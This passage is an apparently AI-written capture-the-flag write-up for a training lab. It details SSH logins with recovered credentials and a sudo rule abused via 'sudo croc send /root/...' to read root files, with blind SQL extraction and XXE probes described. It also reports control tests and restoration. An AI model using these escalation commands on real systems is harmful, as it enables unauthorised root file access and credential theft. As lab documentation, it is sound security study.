+<td>Base64 hint in <code>index.php:191</code>, hidden in <code>color: black</code> text</td>
+<td>—</td>
+<td><code>cmVjdWVyZGEuLi4gdHUgY29udHJhc2VxYSBlcyB0dSB1c3Vhcmlv</code> → <code>recuerda... tu contraseñas es tu usuario</code>. A label, not evidence — tested differentially.</td>
+</tr>
+<tr>
+<td>4</td>
+<td>SSH <code>jeremias:jeremias</code></td>
+<td><code>uid=1001(jeremias)</code></td>
+<td><code>id</code> first. The same guess against <code>ezequiel</code> and <code>ubuntu</code> returns <code>AUTH_FAILED</code>, which is what makes the positive a result rather than a fluke of a permissive authenticator.</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Read <code>[lab-home]/jeremias/ezequiel.pyc</code>, deobfuscate</td>
+<td><code>jeremias</code></td>
+<td>§3. This is why the pyc is in <em>jeremias'</em> home and not <code>ezequiel</code>'s: it is one hop further than it needs to be.</td>
+</tr>
+<tr>
+<td>6</td>
+<td>SSH <code>ezequiel:234r3fsd2-34fsdrr32</code></td>
+<td><code>uid=1002(ezequiel)</code></td>
+<td><code>id</code> first.</td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>sudo croc send /root/passw0rd_r00t.txt</code></td>
+<td><strong>root file read</strong></td>
+<td>The sudoers rule pins the <em>program</em>, not its arguments.</td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>DL{flag_root-C6A4F19D03}</code> from <code>/root/root.txt</code></td>
+<td>—</td>
+<td>via step 7 applied to the directory.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-sudoers-escalation-in-full">The sudoers escalation, in full</h3>
+<p><code>/etc/sudoers.d/ezequiel</code>:</p>
+<pre><code>ezequiel ALL=(ALL) NOPASSWD: /usr/local/bin/croc
+</code></pre>
+<p><code>croc</code> is v10.3.1, a 15 MB Go file-transfer client at <code>/usr/local/bin/croc</code>, mode <code>0755 root:root</code>, not setuid.
+The rule names a program with no argument restriction, so <strong>root can be made to run <code>croc send &lt;path&gt;</code></strong>: croc,
+executing with root's privileges, opens the named file and transmits it. The receiving end runs as the
+unprivileged account and writes the bytes to <code>--stdout</code>. What assembles is an <strong>arbitrary root file-read primitive
+built out of a file-transfer client, not out of a shell</strong> — and <code>croc send /root</code> (a <em>directory</em>) is arbitrary root
+file <em>enumeration</em> the same way, which is how <code>/root/root.txt</code> was found.</p>
+<p>Three pieces of evidence that the elevation is real, none of them circular:</p>
+<pre><code># 1. croc's own line, produced by the root-owned process
+Sending 0 files (10 B)
+Sending 'passw0rd_r00t.txt' (10 B)
+
+# 2. the process table: every sudo-launched croc is root-owned
+    425 root  sudo -n /usr/local/bin/croc ... send /root/passw0rd_r00t.txt
+    427 root  /usr/local/bin/croc ... send /root/passw0rd_r00t.txt
+
+# 3. the low-privilege user cannot even kill them
+$ pkill -x croc        # kills every croc it owns, leaves all six root ones
+</code></pre>
+<p>Evidence 3 is the one worth keeping. An escalation you cannot clean up as the low-privilege user is an
+escalation, and it is observable without executing a single line of the target's code.</p>
+<h3 id="croc-v1031-transfer-mechanics-cost-roughly-ten-cycles-recording-it-so-nobody-repeats-it">croc v10.3.1 transfer mechanics (cost roughly ten cycles; recording it so nobody repeats it)</h3>
+<ol>
+<li><strong>The default protocol does not complete in this environment.</strong> The sender joins its room and advertises
+<code>9015,9016,9017,9018</code>; the receiver logs <code>public IP address</code>, then prints a bare <code>EOF</code> and exits <code>rc=1</code> with no
+error. Reproduced with sender and receiver on the <em>same host over loopback</em>, so it is not a topology problem.</li>
+<li><strong><code>--classic</code> is gated by an interactive confirmation that <code>--yes</code> does not answer</strong> — <code>--yes</code> covers file
+prompts, not this one. Without a tty it reads EOF and exits <code>0</code> having transferred nothing, which looks like
+success.</li>
+<li><strong>The gate is persisted per-<code>$HOME</code> at <code>$HOME/.config/croc/classic_enabled</code></strong> (contents: <code>enabled</code>). Under
+<code>sudo</code>, <code>env_reset</code> sets <code>HOME=/root</code>, so the <em>elevated</em> croc reads <strong>root's</strong> config, not the attacker's.
+Answer the prompt once to create it, then omit <code>--classic</code> entirely — passing the flag is itself the request, so
+it re-prompts forever.</li>
+<li><strong>The receiver needs the phrase in <code>CROC_SECRET</code>, not positionally.</strong> <code>croc &lt;code&gt;</code> is the new-protocol form.</li>
+<li><strong>croc reads piped stdin as the payload.</strong> Without <code>--ignore-stdin</code>,
+<code>printf 'y\n' | croc send /root/file</code> sends <code>stdin (2 B)</code> and ignores the filename — a <em>successful</em> transfer of
+the wrong thing.</li>
+<li><strong>Multicast peer discovery crosses hosts on a shared segment.</strong> A receiver on the attacker host discovered
+<code>[net-0-11]</code> and paired with a <em>stale</em> sender from an earlier experiment; the sender advertised ports
+<code>9015-9018</code> while the receiver got <code>9030-9033</code>, and the room never matched. Two relays, not one bug. Kill stale
+processes and use exactly one relay.</li>
+</ol>
+<hr />
+<h2 id="6-control-tests--what-held">6. Control tests — what held</h2>
+<p>Reported with the same prominence as the findings, because a reader cannot tell an untested control from a
+holding one.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Probe</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Session gate on the XML panel</td>
+<td><code>GET /externalentitiinjection.php</code> with only <code>logged</code> set</td>
+<td><strong>held</strong> — <code>302</code> to <code>index.php</code></td>
+</tr>
+<tr>
+<td>Session gate on the dashboard</td>
+<td><code>GET /dashboard.php</code> with only <code>logged</code> set</td>
+<td><strong>held</strong> — <code>302</code></td>
+</tr>
+<tr>
+<td>sudo is scoped, not blanket</td>
+<td><code>sudo -n id</code></td>
+<td><strong>held</strong> — <code>sudo: a password is required</code></td>
+</tr>
+<tr>
+<td>sudoers grant is real and narrow</td>
+<td><code>sudo -n -l</code></td>
+<td><code>(ALL) NOPASSWD: /usr/local/bin/croc</code> — and nothing else</td>
+</tr>
+<tr>
+<td>Environment injection</td>
+<td><code>sudo -n CROC_SECRET=x croc --version</code></td>
+<td><strong>held</strong> — <code>sorry, you are not allowed to set the following environment variables</code></td>
+</tr>
+<tr>
+<td>croc is not a writable/setuid target</td>
+<td><code>ls -la /usr/local/bin/croc</code></td>
+<td><strong>held</strong> — <code>0755 root:root</code></td>
+</tr>
+<tr>
+<td>Home directory isolation</td>
+<td>XXE as <code>www-data</code> against <code>[lab-home]/jeremias/ezequiel.pyc</code></td>
+<td><strong>held</strong> — <code>0750</code> on the directory blocks traversal; the file is <code>0644</code> but unreachable</td>
+</tr>
+<tr>
+<td>Root SSH</td>
+<td><code>ssh root@…</code> with the recovered password</td>
+<td><strong>held</strong> — <code>AUTH_FAILED</code>; <code>KbdInteractiveAuthentication no</code> and no explicit <code>PermitRootLogin</code>, so the default <code>prohibit-password</code> applies</td>
+</tr>
+<tr>
+<td>Cross-account cleanup</td>
+<td><code>jeremias</code> cannot delete <code>ezequiel</code>'s files</td>
+<td><strong>held</strong></td>
+</tr>
+<tr>
+<td>The lab's own decoder</td>
+<td>run the shipped <code>.pyc</code> with the correct password</td>
+<td><strong>failed</strong> — §3.6, three defects, one silent exit</td>
+</tr>
+<tr>
+<td><code>sudoers.d/jeremias</code></td>
+<td>file exists, <strong>1 byte</strong>, grants nothing</td>
+<td><strong>held</strong> — but see §9</td>
+</tr>
+</tbody>
+</table>
+<p>Two of these are worth more than a finding. The <strong><code>0750</code> home directory</strong> is what forced the chain through
+<code>jeremias</code> before <code>ezequiel</code>, and it is a control that turned out to be load-bearing. The <strong>scoped sudo rule</strong> is
+the difference between &quot;passwordless root&quot; and &quot;root can run one specific program&quot;, and probing a <em>different</em>
+program is what proved the scoping — <code>sudo -l</code> alone would only have been a claim.</p>
+<hr />
+<h2 id="7-unused-findings">7. Unused findings</h2>
+<p>Load-bearing things not used in the chain, each with its own impact.</p>
+<ul>
+<li><strong>Hardcoded DB credential</strong> <code>ctf/ctf</code> with <code>ALL PRIVILEGES ON ctfdb.*</code>, in the document root (F6). Not needed —
+the SQLi was unauthenticated.</li>
+<li><strong><code>LOAD_FILE()</code> / <code>INTO OUTFILE</code></strong> from the SQLi. Not tested: the <code>mysqld</code> user faces the same <code>0750</code> barrier as
+<code>www-data</code> for the pyc, and <code>secure_path</code>/file privileges were not probed. Listed as untested, not as absent.</li>
+<li><strong>SSRF via an external DTD over <code>http://</code>.</strong> <code>LIBXML_DTDLOAD</code> is set, so the external subset is loaded and this
+should work. Not exercised end to end, because it needs a listener the target can reach and the in-band file
+read already solved the lab. <strong>The SSRF half of F2 is therefore reported as reasoned-from-source, not measured.</strong></li>
+<li><strong><code>php://filter</code></strong> resolved successfully, confirming stream wrappers are live. Not needed beyond that.</li>
+<li><strong>Blind SQL extraction</strong> of the <code>users</code> table worked and is how the single row was recovered before root's
+<code>.mysql_history</code> corroborated it. Two independent sources agreeing is why F5 is stated as fact.</li>
+<li><strong>root's <code>.mysql_history</code></strong>, obtained through the croc primitive, independently confirms the schema, the <code>ctf</code>
+grant and the sole <code>notadmin</code> row. Root's <code>.bash_history</code> shows <code>nano admin.php</code> and <code>su ezequiel</code>, <code>su jeremias</code>.</li>
+</ul>
+<hr />
+<h2 id="8-self-correction--prominent-because-it-cost-the-most">8. Self-correction — prominent, because it cost the most</h2>
+<p>Four of my own instruments were wrong before the chain closed. None was a defect in the target.</p>
+<p><strong>8.1 I hashed the whole HTTP response to compare two XXE probes, and the hash measured my own payload.</strong>
+The page echoes the submitted XML back into the <code>&lt;textarea&gt;</code> (<code>:519</code>) and carries a timestamp and session id in the
+footer, so five responses that were semantically identical produced five different md5s — and I briefly had a
+&quot;they differ, so they're distinguishable&quot; result that was pure self-reference. Fixed by extracting <strong>only the
+parsed field value</strong> and comparing that. <em>This is <code>decision-making.md</code> §1 pointed at my own comparison: validate the
+value, not the representation of it.</em></p>
+<p><strong>8.2 I asserted the wrong root cause for <code>V._x</code>'s failure, from a filtered disassembly.</strong>
+My disassembly helper skipped any instruction with an empty <code>argrepr</code>, and in CPython 3.13 <code>CALL n</code> carries its
+argument count in <code>arg</code> — so <strong>every single call instruction was silently deleted</strong>, leaving me to read a stack with
+no calls in it. I concluded &quot;<code>_x</code> applies one base64 decode too many&quot; and wrote that down. The real defect is
+<strong>rot13 and base64-decode applied in the wrong order</strong>. What caught it was not re-reading the code; it was the
+<strong>runtime error type</strong>. <code>binascii.Error: Incorrect padding</code> can only come from <code>b64decode</code>, which located the failing
+call precisely. <em>A filtered view of a stack is not a stack. When the conclusion is about control flow, confirm the
+failure point from the program's own error, not from your rendering of it.</em></p>
+<p><strong>8.3 <code>pkill -f croc</code> killed the shell that contained the string <code>croc</code>.</strong>
+<code>pkill -f</code> matches full command lines, and my launcher was literally
+<code>sh -c 'pkill -f croc; … bash /tmp/esc.sh …'</code>. The launcher killed itself, the new run never started, and I read the
+<strong>previous</strong> run's log — which looked like a plausible current result, complete with a stale code phrase. Fixed by
+killing by port (<code>fuser -k 9009/tcp</code>) or by exact name. <em>This is the &quot;witness you did not create in this run&quot; shape
+aimed at a launcher: the file on disk was well-formed, one step behind the truth, and nothing downstream could tell.</em></p>
+<p><strong>8.4 My first blind-extraction loop returned empty for every value, and I nearly recorded the table as empty.</strong>
+The bug: the prefix-search loop tested <code>SUBSTRING(expr,1,mid) = $prefix</code> with <code>$prefix</code> empty, which is false for
+every <code>mid</code>, so it broke on the first iteration. The fix was <code>SUBSTRING(expr,1,mid) = SUBSTRING('$prefix',1,mid)</code>,
+which is trivially true when <code>prefix</code> is empty and therefore lets the search grow. <em>A detector that returns &quot;nothing
+found&quot; for a table that demonstrably has rows is measuring itself — the same discipline as the existence detector
+that matched its own error message.</em></p>
+<p>Two more that cost a cycle each, recorded because both are traps in this lab specifically:</p>
+<ul>
+<li><strong>croc's flag grammar.</strong> <code>--relay</code> is global (before the subcommand), <code>--port</code>/<code>--code</code> are <code>send</code> options
+(after it), and <code>--port</code> is invalid for the receiver form entirely. Three misplacements, each producing
+<code>flag provided but not defined</code>, each looking like a target problem.</li>
+<li><strong>croc reads piped stdin as the payload.</strong> <code>printf 'y\n' | croc send /root/file</code> transferred <code>stdin (2 B)</code> and
+ignored the filename. The transfer <em>succeeded</em>. Only <code>--ignore-stdin</code> fixes it, and the tell is croc's own
+<code>Sending 'stdin' (2 B)</code> line.</li>
+</ul>
+<hr />
+<h2 id="9-not-tested-vs-discarded-and-one-design-observation">9. Not tested vs discarded, and one design observation</h2>
+<h3 id="not-tested-coverage-gap-declared">Not tested (coverage gap, declared)</h3>
+<ul>
+<li><strong>UDP.</strong> <code>nmap -sU</code> needs root and is unavailable here. No UDP coverage exists in this engagement.</li>
+<li><strong><code>http://</code> external-DTD SSRF.</strong> The half of F2 that would require a listener the target can reach.</li>
+<li><strong><code>expect://</code> code execution through the XML parser.</strong> PHP 8.3's stream wrapper list was not enumerated and the
+vector was not fired.</li>
+<li><strong>The SQLi beyond the <code>users</code> table.</strong> <code>INFORMATION_SCHEMA</code> enumeration was attempted and the extractor bug
+(8.4) blocked it; only <code>users</code> was extracted, via the pre-existing character-by-character routine.</li>
+<li><strong>Any privilege escalation other than the croc rule.</strong> The setuid sweep found only stock Ubuntu binaries, and
+<code>/etc/cron.d</code> holds only <code>e2scrub_all</code> and <code>php</code>.</li>
+</ul>
+<h3 id="discarded-with-reason">Discarded, with reason</h3>
+<table>
+<thead>
+<tr>
+<th>Discarded</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Upload primitive</td>
+<td><code>upload.php</code> is a static HTML decoy; no <code>&lt;?php</code> in it, and it advertises a wrong server version.</td>
+</tr>
+<tr>
+<td><code>ProfetaNet</code> login</td>
+<td>Sets <code>logged</code>, every consumer checks <code>auth</code> (F4). Measured <code>302</code>, not reasoned.</td>
+</tr>
+<tr>
+<td>XXE to reach the <code>.pyc</code></td>
+<td><code>[lab-home]/jeremias</code> is <code>0750</code>; <code>www-data</code> cannot traverse it. The file is world-readable <em>within</em> the directory and unreachable <em>through</em> it — a boundary, not a bug.</td>
+</tr>
+<tr>
+<td><code>jeremias</code> sudo</td>
+<td><code>/etc/sudoers.d/jeremias</code> is 1 byte and grants nothing. <code>sudo -n -l</code> returns nothing for him.</td>
+</tr>
+<tr>
+<td>Reversing <code>class X</code></td>
+<td>It is a complete, correct LCG stream cipher that <strong>nothing references</strong>. The real secret is <code>_p1 + _p2</code>. Attacking the cipher is the intended waste of time.</td>
+</tr>
+<tr>
+<td><code>sudo</code> as root / any other program</td>
+<td>Refused. The rule pins one program.</td>
+</tr>
+<tr>
+<td>The public croc relay</td>
+<td>Reachable, but using it would have sent lab data to a third party. A relay on the attacker-controlled host was used instead.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="design-observation">Design observation</h3>
+<p>The lab is unusually well made in one respect and unusually self-defeating in another.</p>
+<p><strong>Well made:</strong> every control is a <em>real</em> control, not theatre. The <code>0750</code> home directory, the scoped sudo rule, the
+<code>env_reset</code> environment refusal and the session gate all held, and the <code>0750</code> is load-bearing — it is what makes
+the <code>.pyc</code> a second hop instead of a freebie. The lab also ships its own oracle (<code>test.txt</code>), which is a generous
+and pedagogically correct thing to do.</p>
+<p><strong>Self-defeating:</strong> the deobfuscated sample cannot verify its own secret, and the front page cannot reach its own
+authenticated tier. In both cases the author built a control or a feature and then broke it, and in both cases a
+bare <code>except:</code> / a wrong session key hides the breakage behind a plausible-looking surface. The result is that the
+two most valuable artefacts in the lab — the credential oracle and the entry point — can only be exercised by
+reading them, not by running them.</p>
+<p>There is a third instance of the same habit. <code>/etc/sudoers.d/jeremias</code> <strong>exists</strong>: a real, root-owned sudoers
+fragment with a plausible name, granting nothing, one byte long. It is an <em>authorization artifact that looks like a
+grant</em>. An auditor auditing sudoers by listing <code>/etc/sudoers.d/</code> sees a policy for a second account and has to read
+the file to learn it is empty. Per <code>decision-making.md</code> §5 that is a finding in its own right — a file whose
+existence is a claim and whose content is not.</p>
+<hr />
+<h2 id="10-rewards">10. Rewards</h2>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Value</th>
+<th>How obtained</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>[lab-home]/jeremias/user.txt</code></td>
+<td><code>DL{flag_user-8F3A7C9B12}</code></td>
+<td>direct read as <code>jeremias</code></td>
+</tr>
+<tr>
+<td><code>/root/passw0rd_r00t.txt</code></td>
+<td><code>fl4sk1pwd</code></td>
+<td><code>sudo croc send</code> — root file read</td>
+</tr>
+<tr>
+<td><code>/root/root.txt</code></td>
+<td><code>DL{flag_root-C6A4F19D03</code></td>
+<td><code>sudo croc send /root</code> — root directory enumeration</td>
+</tr>
+</tbody>
+</table>
+<p>Note the format is <code>DL{...}</code>, not <code>FLAG{...}</code>. The root password was recovered by an arbitrary-file-read primitive
+rather than by a root shell, because <strong>root SSH is correctly refused</strong> — the credential's only remaining use is as
+a credential, and that is reported as such rather than inflated into a root session.</p>
+<h2 id="11-restoration">11. Restoration</h2>
+<p>The lab was left as shipped and verified by md5 against a container recreated from the original
+<code>labs/209/profetas.tar</code>.</p>
+<pre><code>e3f087412ab3c19810fe24bc6840af87  /var/www/html/admin.php
+5f7e820342feae96603c0ea621c07e95  /var/www/html/config.php
+1fe0e1b05e303abeb509ad5bfbc5a26c  /var/www/html/dashboard.php
+dac60a79bce0b031ab36a440e0beaad4  /var/www/html/externalentitiinjection.php
+7906817bc9e832ef597154257019ffc4  /var/www/html/index.php
+a532f69954b89732468448265da4d92e  /var/www/html/logout.php
+11665ab994c972a7afa185c739874444  /var/www/html/upload.php
+87978e0dfadc2f75cafc0d21600eaa55  /var/www/html/test.txt
+1e932453bfb5dbe2dab6683002bad737  [lab-home]/jeremias/ezequiel.pyc
+43953b010520cdcabb7eea8e4071c8c1  [lab-home]/jeremias/user.txt
+6b470d4c3fd1014854c852d546187076  [lab-home]/ezequiel/acces0.txt
+d379c673537eb32eb897477fa190b3b0  /root/root.txt
+a97d6de97b539c3db78a94a843a2aab8  /root/passw0rd_r00t.txt
+</code></pre>
+<p>All identical before and after. The container and image were removed and reloaded from the tarball, and the
+<code>[lab-home]/.config/croc/</code> directory that did not exist in the shipped image is confirmed absent. Every SQLi and XXE probe
+was read-only; the webroot md5s never changed.</p>
+<p>The only artefact that could not be removed unprivileged was a set of root-owned <code>croc-stdin-*</code> files in
+<code>[lab-home]/ezequiel</code> and the root-owned croc processes — <strong>both consequences of the escalation itself</strong>, and both
+discarded with the container.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
